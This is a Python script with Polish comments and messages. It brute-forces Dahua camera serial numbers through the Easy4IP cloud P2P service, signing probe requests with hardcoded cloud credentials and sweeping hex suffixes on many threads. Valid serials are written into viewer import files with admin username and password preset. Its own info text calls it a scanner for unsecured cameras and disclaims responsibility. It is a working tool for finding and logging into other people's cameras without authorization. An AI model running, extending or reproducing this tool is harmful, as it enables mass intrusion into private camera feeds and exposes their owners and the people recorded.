#!/usr/bin/env python3
# - jakissajmon / @jakissajmonn

import argparse
import base64
import datetime
import hashlib
import json
import os
import random
import socket
import sys
import threading
import signal
import xml.etree.ElementTree as ET
import urllib.request
from pathlib import Path
from struct import pack, unpack
from queue import Queue

import xmltodict

MAIN_SERVER = "www.easy4ipcloud.com"
MAIN_PORT = 8800

USERNAME = "cba1b29e32cb17aa46b8ff9e73c7f40b"
USERKEY = "996103384cdf19179e19243e959bbf8b"
RANDSALT = "5daf91fc5cfc1be8e081cfb08f792726"
NAZWAPLIKU = "result"
IV = b"2z52*lk9o6HRyJrf"

CSEQ = 0

TIMEOUT = 3
MAX_RETRIES = 3
OSTATNICOMMIT = "NIEZNANY"
MAX_DEVICES_PER_XML = 64
PASSWORD = ""
PORT = "37777"
USERNAME_XML = "admin"
PROTOCOL = "1"
CONNECT = "19"
PREFIXY = []
PREFIXYNIEZNANE = [
    "4E02327PAZ",
    "4L0B95APAZ",
    "5L0737APAZ",
    "4F01E1APAZ",
    "3J02F35PAZ",
    "4C07263PAZ",
    "3F03B7EPAZ",
    "5B01F5BPAZ",
    "4H0422APAZ",
    "3E01307PAK",
    "4L08B3DPAZ",
    "3L04E98PAZ",
    "4H00B33PAZ",
    "7K09310PAZ",
    "4E04646PAZ",
    "4J00CB7PAZ",
    "7L02290PAZ",
    "6E09BB4PAZ",
    "7H09BCDPAZ",
    "4L0041FPAZ",
    "4L07695PAZ",
    "4J0448CPAJ",
    "3L03691PAG",
    "3C06108PAK",
    "3E027C1PAK",
    "4E0743BPAG",
    "5H09FFFPAJ",
    "4L00D8APAJ",
    "3F031C4PAK",
    "5G091ECPAJ",
    "5F076CDPAJ",
    "4C02246PAG",
    "4B02D90PAG",
    "5M043D2PAJ",
    "4L00D8APAJ",
    "5C009E1PAJ",
    "5B039CAPAJ",
    "4L0A835PAJ",
    "4E0743BPAG",
    "3D02E11PAK",
    "5B039CAPAJ",
    "3K01ED7PAG",
    "5B01849PAJ",
    "4E08005PAG",
    "3L0593APAG",
    "3L06A69PAG",
    "3L03691PAG",
    "5K08EDCPAJ",
    "4L04B60PAJ",
    "3K01ED7PAG",
    "3K02DFFPAG",
    "4K06CC2PAJ",
    "4L0675APAJ",
    "3L03691PAG",
    "4G06B52PAJ",
    "5F016C4PAJ",
    "3K02DFFPAG",
    "5F079D0PAJ",
    "4B02D90PAG",
    "3C09527PAK",
    "4L06759PAJ",
    "4J083B5PAZ",
    "4L0001DPAZ",
    "4L0A606PAZ",
    "4M013E5PAZ",
    "5C01FD2PAZ",
    "4L03007PAZ",
    "4L063FDPAZ",
    "4E00AE3PAZ",
    "4J006C8PAZ",
    "4L03B6APAZ",
    "3L00669PAZ",
    "3K01FB1PAZ",
    "3D0515DPAG",
    "4C03414PAZ",
    "5C014A6PAZ"
]


xml_file_counter = 0
current_xml_devices = 0
xml_lock = threading.Lock()

def najnowszycommit():
    req = urllib.request.Request(
        "https://api.github.com/repos/jakissajmon/ipc-skaner/commits/main",
        headers={"User-Agent": "brak"}
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        data = json.loads(resp.read().decode("utf-8"))
    return data["sha"]

def spraktualizacje():
    try:
        nowyc = najnowszycommit()
    except Exception:
        print("Nie można sprawdzić aktualizacji, sprawdź połączenie z internetem.")
        return
    scsc = Path(__file__).resolve()
    tekstsc = scsc.read_text(encoding="utf-8")
    prlin = f'OSTATNICOMMIT = "{OSTATNICOMMIT}"'
    nwlin = f'OSTATNICOMMIT = "{nowyc}"'
    if OSTATNICOMMIT == "NIEZNANY":
        if prlin in tekstsc:
            tekstsc = tekstsc.replace(prlin, nwlin, 1)
            scsc.write_text(tekstsc, encoding="utf-8")
            print(f"Aktualny commit: {nowyc[:7]}")
        return
    if nowyc != OSTATNICOMMIT:
        print("🚀 Dostępna aktualizacja!")
        print(f"Obecnie:   {OSTATNICOMMIT[:7]}")
        print(f"Najnowsza: {nowyc[:7]}")
        if prlin in tekstsc:
            tekstsc = tekstsc.replace(prlin, nwlin, 1)
            scsc.write_text(tekstsc, encoding="utf-8")
    else:
        print("✅ Używasz najnowszej wersji.")

def signal_handler(sig, frame):
    print("\n[!] Przerwano przez użytkownika.")
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)


def parse_response(data):
    try:
        headers, body = data.split("\r\n\r\n", 1)
    except ValueError:
        print("Nie można oddzielić nagłówków od treści.")
        sys.exit(1)
    headers = headers.split("\r\n")
    try:
        version, code, status = headers[0].split(" ", 2)
    except ValueError:
        print("Nieprawidłowy format odpowiedzi w pierwszej linii.")
        sys.exit(1)
    code = int(code)
    return {
        "version": version,
        "code": code,
        "status": status,
        "headers": dict(h.split(": ", 1) for h in headers[1:] if ": " in h),
        "data": xmltodict.parse(body) if body.strip() else None,
    }


class UDP(socket.socket):
    def __init__(self, host, port, debug=False):
        super().__init__(socket.AF_INET, socket.SOCK_DGRAM)
        self.bind(("0.0.0.0", 0))
        self.debug = debug
        self.lhost, self.lport = self.getsockname()
        self.rhost = host
        self.rport = port

    def send(self, data):
        self.sendto(data, (self.rhost, self.rport))

    def recv(self, bufsize=4096, timeout=None):
        if timeout:
            self.settimeout(timeout)
        data = self.recvfrom(bufsize)[0]
        if timeout:
            self.settimeout(None)
        return data

    def read(self, return_error=False, timeout=None):
        data = self.recv(timeout=timeout).decode()
        if self.debug:
            print(f":{self.lport} <<< {self.rhost}:{self.rport}")
            print(data.replace("\r\n", "\n"))
        res = parse_response(data)
        if not return_error and res["code"] >= 400:
            if self.debug:
                print("Error:", res["status"])
            sys.exit(1)
        return res

    def request(self, path, body="", auth=True, should_read=True, return_error=False, timeout=None):
        global CSEQ
        CSEQ += 1
        nonce = random.randrange(2**31)
        curdate = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
        pwd = f"{nonce}{curdate}DHP2P:{USERNAME}:{USERKEY}"
        hash_digest = hashlib.sha1()
        hash_digest.update(pwd.encode())
        digest = base64.b64encode(hash_digest.digest()).decode()

        req = f"""{'DHPOST' if body else 'DHGET'} {path} HTTP/1.1
CSeq: {CSEQ}
"""
        if auth:
            req += f"""Authorization: WSSE profile="UsernameToken"
X-WSSE: UsernameToken Username="{USERNAME}", PasswordDigest="{digest}", Nonce="{nonce}", Created="{curdate}"
"""
        if body:
            req += f"""Content-Type: 
Content-Length: {len(body)}
"""
        req += f"""
{body}"""
        if self.debug:
            print(f":{self.lport} >>> {self.rhost}:{self.rport}")
            print(req)
        self.send(req.replace("\n", "\r\n").encode())
        return self.read(return_error=return_error, timeout=timeout) if should_read else None


def generate_candidate_serial_fixed(prefix, num):
    suffix = format(num, '05X')
    return prefix + suffix


def add_device_to_xml(serial):
    global xml_file_counter, current_xml_devices
    
    with xml_lock:
        if current_xml_devices == 0 or current_xml_devices >= MAX_DEVICES_PER_XML:
            if current_xml_devices >= MAX_DEVICES_PER_XML:
                xml_file_counter += 1
            
            device_manager = ET.Element("DeviceManager", version="2.0")
            

            tree = ET.ElementTree(device_manager)
            
            if xml_file_counter == 0:
                filename = f"{NAZWAPLIKU}.xml"
            else:
                filename = f"{NAZWAPLIKU}{xml_file_counter}.xml"
            
            tree.write(filename, encoding="UTF-8", xml_declaration=True)
            
            current_xml_devices = 0
        
        if xml_file_counter == 0:
            filename = f"{NAZWAPLIKU}.xml"
        else:
            filename = f"{NAZWAPLIKU}{xml_file_counter}.xml"
        
        try:
            tree = ET.parse(filename)
            device_manager = tree.getroot()
        except:
            device_manager = ET.Element("DeviceManager", version="2.0")
            tree = ET.ElementTree(device_manager)
        
        device = ET.SubElement(device_manager, "Device")
        device.set("name", f"gg/eF9wWm3ufU {serial}")
        device.set("domain", serial)
        device.set("port", PORT)
        device.set("username", USERNAME_XML)
        device.set("password", PASSWORD)
        device.set("protocol", PROTOCOL)
        device.set("connect", CONNECT)
        
        tree.write(filename, encoding="UTF-8", xml_declaration=True)
        
        current_xml_devices += 1
        
        print(f"[+] S/N {serial} dodany do pliku {filename} (urządzenie {current_xml_devices}/{MAX_DEVICES_PER_XML})")
        
        return filename

def test_serial(serial, debug=False):
    main_remote = UDP(MAIN_SERVER, MAIN_PORT, debug)
    try:
        res_online = main_remote.request(f"/online/p2psrv/{serial}", return_error=True, timeout=TIMEOUT)
    except socket.timeout:
        if debug:
            print(f"Timeout w żądaniu /online/p2psrv/{serial} na serwerze głównym.")
        return False

    try:
        p2psrv_info = res_online["data"]["body"]["US"]
        p2psrv_server, p2psrv_port = p2psrv_info.split(":")
        p2psrv_port = int(p2psrv_port)
        if debug:
            print(f"Uzyskano p2psrv: {p2psrv_server}:{p2psrv_port}")
    except Exception as e:
        if debug:
            print(f"Błąd podczas uzyskiwania p2psrv dla S/N {serial}: {e}")
        return False

    p2psrv_remote = UDP(p2psrv_server, p2psrv_port, debug)
    retries = 0
    res_device = None
    while retries < MAX_RETRIES:
        try:
            res_device = p2psrv_remote.request(f"/probe/device/{serial}", return_error=True, timeout=TIMEOUT)
            break
        except socket.timeout:
            if debug:
                print(f"Timeout w żądaniu z S/N {serial}, próbuję ponownie... (Próba {retries+1})")
            retries += 1
    p2psrv_remote.close()
    if retries == MAX_RETRIES or res_device is None:
        return False

    if debug:
        print(f"Odpowiedź dla S/N {serial}: {res_device['code']} {res_device['status']}")

    if res_device.get("code") == 200:
        if debug:
            print(f"[+] S/N prawidłowy (HTTP 200): {serial}")
        filename = add_device_to_xml(serial)
        with open("valid_serials.txt", "a") as f:
            f.write(f"{serial} - Odpowiedź: {res_device}\n")
        return True
    else:
        if debug:
            print(f"Test dla S/N {serial} zwrócił nieprawidłowy kod {res_device.get('code')}.")
    return False

def worker(q, prefix, valid_serials, lock, debug=False, losowyprefix=False, wszystkieprefixy=False):
    while True:
        try:
            num = q.get(timeout=1)
        except Exception:
            break
        candidate_serial = generate_candidate_serial_fixed(prefix, num)
        if debug:
            print(f"[{num:06d}] Testowanie S/N: {candidate_serial}")
        else:
            if num % 1000 == 0:
                if losowyprefix or wszystkieprefixy:
                    print(f"[{num:06d}] Testowanie {candidate_serial[-5:]}...")
                else:
                    print(f"[{num:06d}] Testowanie {candidate_serial}...")
        if wszystkieprefixy:
            for uprefiks in PREFIXY:
                candidate_serial = generate_candidate_serial_fixed(uprefiks, num)
                try:
                    if test_serial(candidate_serial, debug):
                        with lock:
                            print(f"[+] S/N prawidłowy: {candidate_serial} (con num={num})")
                            valid_serials.append((num, candidate_serial))
                except Exception as e:
                    if debug:
                        print(f"Błąd w próbie z S/N {candidate_serial}: {e}")
        else:
            try:
                if test_serial(candidate_serial, debug):
                    with lock:
                        print(f"[+] S/N prawidłowy: {candidate_serial} (con num={num})")
                        valid_serials.append((num, candidate_serial))
            except Exception as e:
                if debug:
                    print(f"Błąd w próbie z S/N {candidate_serial}: {e}")
        q.task_done()
def brute_force_fixed(prefix, max_range, debug=False, watki=250, losowe=False, losowesn=False, wszystkieprefixy=False, suffix=00000):
    q = Queue()
    nums = list(range(max_range))
    putst = False
    if losowe:
        random.shuffle(nums)
    for num in nums:
        if num == suffix:
            putst = True
        if putst:
            q.put(num)
    valid_serials = []
    lock = threading.Lock()
    threads = []
    for _ in range(watki):
        if losowesn:
            t = threading.Thread(target=worker, args=(q, random.choice(PREFIXY), valid_serials, lock, debug, True, False))
        else:
            t = threading.Thread(target=worker, args=(q, prefix, valid_serials, lock, debug, False, wszystkieprefixy))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while not q.empty():
            import time
            time.sleep(0.5)
        
        q.join()
        
    except KeyboardInterrupt:
        print("\n[!] Przerwano przez użytkownika")
        os._exit(0) 

    return valid_serials

def show_xml_summary():
    print("\n" + "="*50)
    print("PODSUMOWANIE PLIKU XML")
    print("="*50)
    
    xml_files = []
    for i in range(xml_file_counter + 1):
        if i == 0:
            filename = f"{NAZWAPLIKU}.xml"
        else:
            filename = f"{NAZWAPLIKU}{i}.xml"
        
        if os.path.exists(filename):
            try:
                tree = ET.parse(filename)
                device_manager = tree.getroot()
                devices = device_manager.findall("Device")
                xml_files.append((filename, len(devices)))
            except:
                xml_files.append((filename, 0))
    
    total_devices = 0
    for filename, count in xml_files:
        print(f"{filename}: {count} urządzenia")
        total_devices += count
    
    print(f"\nRAZEM: {total_devices} urządzenia znalezione w {len(xml_files)} plikach.")
    print("="*50)

def tak_nie(pyt):
    while True:
        odp = input(f"{pyt} (y/n): ").strip().lower()
        if odp in ("y", "n"):
            return odp == "y"
def numer_pyt(pyt):
    while True:
        try:
            return int(input(pyt))
        except:
            print("Nieprawidłowa odpowiedź.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Bruteforce numerów seryjnych składające się ze stałego 10-znakowego prefiksu i szesnastkowego sufiksu (5 cyfr)."
    )
    parser.add_argument("--informacje", action="store_true", help="Informacje.")
    parser.add_argument("-pr", "--prefix", help="Pierwsze 10 znaków S/N.")
    parser.add_argument("-r", "--losowyprefiks", action="store_true", help="Użyj losowego prefiksu.")
    parser.add_argument("-mr", "--wielelosowych", action="store_true", help="Użyj wielu losowych prefiksów.")
    parser.add_argument("-ma", "--wszystkieprefiksy", action="store_true", help="Użyj wszystkich prefiksów.")
    parser.add_argument("-f", "--prefiksy", help="Plik z prefiksami.(Wymagane)")
    parser.add_argument("-s", "--suffix", type=int, default=00000, help="Suffix od którego chcesz rozpocząć.")
    parser.add_argument("-l", "--losowo", action="store_true", help="Skanowanie w losowej kolejności(mniejsza szansa na powtórki)")
    parser.add_argument("-m", "--max", type=int, default=16**5, help="Maksymalna liczba kandydatów (razem 16^5 = 1048576).")
    parser.add_argument("-mx", "--makskamer", type=int, default=64, help="Maksymalna liczba urządzeń na plik.")
    parser.add_argument("-t", "--watki", type=int, default=100, help="Wątki.")
    parser.add_argument("-n", "--plik", default="result", help="Nazwa pliku.")
    parser.add_argument("-p", "--haslo", default="zObUGcYiOmKzbcGf5apioJRDm9z8h2/70uoBAdXZw7OkbtVA0VOAseD4", help="Hasło, którego chcesz użyć.")
    parser.add_argument("-i", "--interaktywny", action="store_true", help="Tryb interaktywny.")
    parser.add_argument("-d", "--debug", action="store_true", help="Debugowanie")
    args = parser.parse_args()
    print("""▀█▀ ░█▀▀█ ░█▀▀█ ── ░█▀▀▀█ ░█─▄▀ ─█▀▀█ ░█▄─░█ ░█▀▀▀ ░█▀▀█ 
░█─ ░█▄▄█ ░█─── ▀▀ ─▀▀▀▄▄ ░█▀▄─ ░█▄▄█ ░█░█░█ ░█▀▀▀ ░█▄▄▀ 
▄█▄ ░█─── ░█▄▄█ ── ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ░█▄▄▄ ░█─░█""")
    if args.informacje:
        print("Ten program to (o WIELE)ulepszony i przetłumaczony skaner niezabezpieczonych kamer firmy Dahua na bazie portugalskiego(?) skanera nieznanego autora z discorda.")
        print("PREFIKS - Pierwsze 10 znaków numeru seryjnego(SN).")
        print("SUFFIKS - Ostatnie 5 znaków numeru seryjnego(SN).")
        print()
        print("Discord >> .gg/eF9wWm3ufU")
        print("Autor >> jakissajmon (dc: @jakissajmonn)")
        print()
        print("OSTRZEŻENIE: Nie odpowiadam(-y) za jakiekolwiek szkody wyrządzone tym programem. Zbyt duża liczba wątków może doprowadzić do awarii lub znacznego spowolnienia internetu(zalecane jest używanie VPS-ów). Wszystko robisz na własną odpowiedzialność.")
        print("Współautorzy/Podziękowania(dc):")
        print("@foidrape1488 - ogólna pomoc przy programie, numerach seryjnych, etc.")
        print("@_ogureczek - znalezienie oryginalnego skanera")
        sys.exit(0)
    spraktualizacje()
    print()
    if args.interaktywny:
        if args.prefiksy is not None:
            args.losowyprefiks = True
        else:
            args.prefix = input("Podaj swój prefix: ")
        args.watki = numer_pyt("Ile chcesz użyć wątków? ")
        args.losowo = tak_nie("Czy chcesz skanować w losowej kolejności?")
        if args.losowyprefiks:
            args.wielelosowych = tak_nie("Czy chcesz używać wielu losowych prefixów?")
            if args.wielelosowych:
                args.losowyprefiks = False
                args.wszystkieprefiksy = tak_nie("Czy chcesz testować wszystkie prefixy?")
                if args.wszystkieprefiksy:
                    args.wielelosowych = False
        if tak_nie("Czy chcesz rozpocząć od własnego suffixu?"):
            args.suffix = numer_pyt("Podaj swój suffix: ")
    if args.prefiksy is None and args.prefix is None:
        parser.error("lista prefiksów jest wymagana.")
    if sum([args.losowyprefiks, args.wielelosowych, args.wszystkieprefiksy]) > 1:
        parser.error("Wybierz jeden tryb(-r, -mr, -ma).")
    if args.prefix and len(args.prefix) != 10:
        parser.error("należy podać prefix kamery.")
    if args.prefiksy is not None:
        if os.path.isfile(args.prefiksy):
            with open(args.prefiksy, "r", encoding="utf-8") as f:
                for line in f:
                    lin = line.strip()
                    if len(lin) == 10:
                        PREFIXY.append(lin)
    if args.losowyprefiks:
        uzywanyprefix = random.choice(PREFIXY)
    elif args.wielelosowych or args.wszystkieprefiksy:
        uzywanyprefix = "losowy"
    else:
        uzywanyprefix = args.prefix
    if len(uzywanyprefix) != 10 and not args.wielelosowych and not args.wszystkieprefiksy:
        print("Prefix musi mieć 10 znaków.")
        sys.exit(1)

    if os.path.exists("valid_serials.txt"):
        os.remove("valid_serials.txt")
    NAZWAPLIKU = args.plik
    PASSWORD = args.haslo
    MAX_DEVICES_PER_XML = args.makskamer
    xml_file_counter = 0
    current_xml_devices = 0

    print("="*60)
    print("ROZPOCZYNANIE BRUTEFORCE S/N")
    if args.wielelosowych:
        print("Używanie losowych prefiksów.")
    else:
        print(f"Prefiks: {uzywanyprefix}")
    print(f"Zakres: 0 - {args.max-1} (razem: {args.max} kandydatów)")
    print(f"Hasło: {PASSWORD}")
    print(f"Maksymalna liczba urządzeń/plik: {MAX_DEVICES_PER_XML}")
    print("="*60)
    print()

    valid = brute_force_fixed(uzywanyprefix, args.max, args.debug, args.watki, args.losowo, args.wielelosowych, args.wszystkieprefiksy, args.suffix)
    
    if valid:
        print("\n" + "="*60)
        print("PRAWIDŁOWE S/N ZNALEZIONE:")
        print("="*60)
        for num, serial in valid:
            print(f"  num={num:06d}: {serial}")
        print(f"\nŁącznie: {len(valid)}")
        
        show_xml_summary()
    else:
        print("\nNie znaleziono żadnych prawidłowych S/N w określonym zakresie.")
